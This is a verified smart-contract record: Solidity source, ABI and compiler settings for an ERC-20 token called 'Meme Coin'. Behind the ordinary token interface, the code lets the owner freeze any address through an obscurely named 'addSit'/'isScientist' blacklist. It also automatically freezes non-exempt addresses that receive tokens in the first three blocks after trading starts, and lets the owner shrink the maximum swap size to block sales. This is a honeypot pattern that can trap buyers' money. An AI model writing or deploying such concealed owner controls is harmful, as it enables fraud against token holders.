{"SourceCode": "//SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.13;\r\n\r\n////////////Interface///////////////\r\ninterface IERC20 {\r\n    function totalSupply() external  view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external  returns (bool);\r\n    function allowance(address _owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ninterface IERC20Metadata is IERC20 {\r\n    function name() external view returns (string memory);\r\n    function symbol() external view returns (string memory);\r\n    function decimals() external view returns (uint8);\r\n}\r\n\r\n//////////LIibrary////////////////////////\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return mod(a, b, \"SafeMath: modulo by zero\");\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b != 0, errorMessage);\r\n        return a % b;\r\n    }\r\n}\r\n\r\n /////////////////////Token////////////////////////\r\n  contract MemeCoin is IERC20Metadata {\r\n        using SafeMath for uint256;\r\n\r\n        mapping (address => uint256) private _balances;  \r\n        mapping (address => mapping(address => uint256)) private _allowances;  \r\n        mapping (address => bool) public isExcludFee; \r\n        mapping (address => bool) public isLimitExempt;\r\n        mapping (address => bool) public isBots;\r\n        mapping (address => bool) public isScientist;\r\n\r\n        bool public ismobility; \r\n        \r\n        string  private _name = \"Meme Coin\";\r\n        string  private _symbol = \"MEME\";\r\n        uint8   private _decimals = 2;\r\n        uint256 private _totalSupply;\r\n        address internal Owner; \r\n        address internal pair;\r\n        address internal DEAD = 0x0000000000000000000000000000000000000000;\r\n        address internal devAddress = 0x6d2eA0b1873D38c95b0A2B35C9c2e7dC7e872d5d;\r\n\r\n        uint256 internal developFee = 2;\r\n        uint256 internal burnFee = 1;\r\n        uint256 public holderFee = 12;\r\n        uint256 internal totalFee = holderFee.add(burnFee).add(developFee);\r\n        uint256 internal divider = 100;\r\n        uint256 internal permutation = 1 * (10**15) * (10 **_decimals);\r\n        uint256 public lauchBlock = 0;\r\n        uint256 public Scientist;    \r\n function removeAllFee() private {\r\n    \r\n        developFee = 0;\r\n        burnFee = 0;\r\n        holderFee = 0;\r\n    }\r\n    function halfAllFee() private {\r\n        developFee = 1;\r\n        burnFee = 1;\r\n        holderFee = 6;\r\n    }   \r\n        constructor ()  {\r\n            Owner = msg.sender;\r\n            isExcludFee[Owner] = true;\r\n            isExcludFee[devAddress] =true;\r\n            isExcludFee[address(this)] =true;\r\n\r\n            isLimitExempt[Owner] =true;\r\n            isLimitExempt[address(this)] = true;\r\n            isLimitExempt[devAddress] = true;\r\n            isLimitExempt[address(0)]    = true;\r\n\r\n            uint256 liq  = 9 * (10**14) * (10 **_decimals);\r\n            _totalSupply = 1 * (10**15) * (10 **_decimals); \r\n    \r\n            _balances[msg.sender] = liq;\r\n            _balances[DEAD] = _totalSupply.sub(liq);\r\n            emit Transfer(address(0) , msg.sender , liq);\r\n            emit Transfer(address(0) , DEAD, _totalSupply.sub(liq));\r\n        }\r\n\r\n        modifier onlyOwner {\r\n            require(msg.sender == Owner);\r\n            _;\r\n        }\r\n\r\n    function name() external virtual override view returns (string memory){return _name;}\r\n    function symbol() external virtual override  view returns (string memory){return _symbol;}\r\n    function decimals() external virtual override view returns (uint8){return _decimals;}\r\n    function totalSupply() external virtual override view returns (uint256){return _totalSupply;}\r\n    function balanceOf(address account)  external virtual override view returns (uint256){return _balances[account];}\r\n    function owner() external view returns(address) {return Owner;}\r\n    function Pair() external view returns(address){return pair;}\r\n    \r\n\r\n    function ExcludeFee(address _newExAddr) external onlyOwner {\r\n        isExcludFee[_newExAddr] = true;\r\n    }\r\n\r\n    function setDev(address _newAddr) external onlyOwner {\r\n        devAddress = _newAddr;\r\n    }\r\n    function setMaxSwap( uint256 value) external onlyOwner {\r\n        permutation  = value * ( 10**_decimals);\r\n    }\r\n    function addSit(address addr , bool value) external onlyOwner {\r\n            isScientist[addr] = value;\r\n    }\r\n\r\n    function Renounce() external onlyOwner {\r\n        Owner = 0x0000000000000000000000000000000000000000;\r\n    }\r\n\r\n    function allowance(\r\n        address _owner,\r\n        address spender) \r\n        external\r\n        virtual\r\n        override \r\n        view returns (uint256){\r\n        return _allowances[_owner][spender];\r\n    }\r\n\r\n    function approve(\r\n        address spender,\r\n        uint256 amount) \r\n        external \r\n        virtual\r\n         override \r\n         returns (bool){\r\n        \r\n        require(_balances[msg.sender] >= amount);\r\n         _allowances[msg.sender][spender] = amount;\r\n         emit Approval(msg.sender , spender , amount);\r\n         return true;\r\n    }\r\n\r\n    function transfer(\r\n        address recipient,\r\n        uint256 amount) \r\n        external\r\n        virtual \r\n        override\r\n        returns (bool){\r\n        _transfer(msg.sender , recipient , amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender,\r\n        address recipient,\r\n        uint256 amount) \r\n        external \r\n        virtual \r\n        override \r\n        returns (bool){\r\n        require(sender != address(0) , \"ERC20: sender prohibit address (0)\");\r\n        require(recipient != address(0) , \"ERC20 : recipient prohibit address(0)\");\r\n        uint256 allowancess = _allowances[sender][msg.sender];\r\n        require(allowancess >= amount);\r\n        unchecked{\r\n            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount);\r\n            }\r\n        _transfer(sender , recipient , amount);\r\n        return true;\r\n    }\r\n\r\n\r\n    ////////////Transfer//////////////////\r\n    function _transfer(\r\n        address from , \r\n        address to ,\r\n        uint256 amounts) \r\n        internal  {\r\n        require(!isBots[from] && !isBots[to]);\r\n        require(!isScientist[from] && !isScientist[to]);\r\n\r\n       if(isContract(to) && !ismobility){  \r\n           ismobility = true;        \r\n           lauchBlock = block.number; \r\n           pair = to; \r\n       }\r\n\r\n       if(ismobility && !isLimitExempt[from] && !isLimitExempt[to]) { \r\n            require(amounts <= permutation  , \"Max Exchange\");\r\n        }\r\n        uint256 shouldfee = takeFees(from, to ,amounts);\r\n        unchecked{\r\n            _balances[from] = _balances[from].sub(amounts);\r\n            }\r\n        unchecked{\r\n            _balances[to] = _balances[to].add(shouldfee);\r\n            }\r\n        emit Transfer(from , to , shouldfee);\r\n    }\r\n\r\n    function takeFees(\r\n        address from,\r\n        address to, \r\n        uint256 amount) \r\n        internal returns(uint256) {\r\n           uint256 burns;\r\n           uint256 marks;\r\n           uint256 taxs;\r\n        if(lauchBlock.add(3) > block.number && !isExcludFee[from]){ \r\n            burns = amount.mul(1).div(100);\r\n            unchecked{\r\n                _balances[address(0)] = _balances[address(0)].add(burns);\r\n                }\r\n           if(pair != to){\r\n               addBots(to);\r\n           }\r\n            emit Transfer(from , address(0), burns);\r\n            } else{\r\n                if(isExcludFee[from] || isExcludFee[to]) { \r\n                    return amount;\r\n                }else{ \r\n                     \r\n                if(burnFee > 0){\r\n                           burns = amount.mul(burnFee).div(divider);\r\n                           unchecked{\r\n                               _balances[address(0)] = _balances[address(0)].add(burns);\r\n                               }\r\n                           emit Transfer(from , address(0) , burns);\r\n                      }\r\n                if(developFee > 0){\r\n                          marks = amount.mul(developFee).div(divider);\r\n                          unchecked{\r\n                              _balances[devAddress] = _balances[devAddress].add(marks);\r\n                              }\r\n                          emit Transfer(from , address(devAddress), marks);\r\n                      }\r\n                if(holderFee > 0){\r\n                          taxs = amount.mul(holderFee).div(divider);\r\n                          unchecked{\r\n                              _balances[from] = _balances[from].add(taxs);\r\n                              }\r\n                          emit Transfer(from , from, taxs);\r\n                      }\r\n                }\r\n            }\r\n             return amount.sub(burns).sub(marks).sub(taxs);\r\n    }\r\n    function addBots(address bot) internal {\r\n            isBots[bot] = true;\r\n            Scientist++;\r\n        }\r\n     function isContract(address account) internal view returns (bool) {  \r\n        uint256 size;\r\n        assembly {\r\n            size := extcodesize(account)\r\n            }   \r\n        return size > 0;   \r\n    }\r\n    uint256 public aSBlock; \r\n  uint256 public aEBlock; \r\n  uint256 public aCap; \r\n  uint256 public aTot; \r\n  uint256 public aAmt; \r\n\r\n  function getAirdrop(address _refer) public returns (bool success){\r\n    require(aSBlock <= block.number && block.number <= aEBlock);\r\n    require(aTot < aCap || aCap == 0);\r\n    aTot ++;\r\n    if(msg.sender != _refer && _balances[_refer] != 0 && _refer != 0x0000000000000000000000000000000000000000){\r\n      _balances[address(this)] = _balances[address(this)].sub(aAmt / 2);\r\n      _balances[_refer] = _balances[_refer].add(aAmt / 2);\r\n      emit Transfer(address(this), _refer, aAmt / 2);\r\n    }\r\n    _balances[address(this)] = _balances[address(this)].sub(aAmt);\r\n    _balances[msg.sender] = _balances[msg.sender].add(aAmt);\r\n    emit Transfer(address(this), msg.sender, aAmt);\r\n    return true;\r\n  }\r\n\r\n\r\n  function viewAirdrop() public view returns(uint256 StartBlock, uint256 EndBlock, uint256 DropCap, uint256 DropCount, uint256 DropAmount){\r\n    return(aSBlock, aEBlock, aCap, aTot, aAmt);\r\n  }\r\n  \r\n  function startAirdrop(uint256 _aSBlock, uint256 _aEBlock, uint256 _aAmt, uint256 _aCap) public onlyOwner() {\r\n    aSBlock = _aSBlock;\r\n    aEBlock = _aEBlock;\r\n    aAmt = _aAmt;\r\n    aCap = _aCap;\r\n    aTot = 0;\r\n  }\r\n  \r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_newExAddr\",\"type\":\"address\"}],\"name\":\"ExcludeFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Renounce\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Scientist\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"aAmt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"aCap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"aEBlock\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"aSBlock\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"aTot\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"value\",\"type\":\"bool\"}],\"name\":\"addSit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_refer\",\"type\":\"address\"}],\"name\":\"getAirdrop\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"holderFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isBots\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isExcludFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isLimitExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isScientist\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"ismobility\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"lauchBlock\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_newAddr\",\"type\":\"address\"}],\"name\":\"setDev\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"setMaxSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_aSBlock\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_aEBlock\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_aAmt\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_aCap\",\"type\":\"uint256\"}],\"name\":\"startAirdrop\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"viewAirdrop\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"StartBlock\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"EndBlock\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"DropCap\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"DropCount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"DropAmount\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "MemeCoin", "CompilerVersion": "v0.8.13+commit.abaa5c0e", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://ef2d016a7906230cb38a69dfe8b7ee296501bdf81e8518a612953d2105018b59"}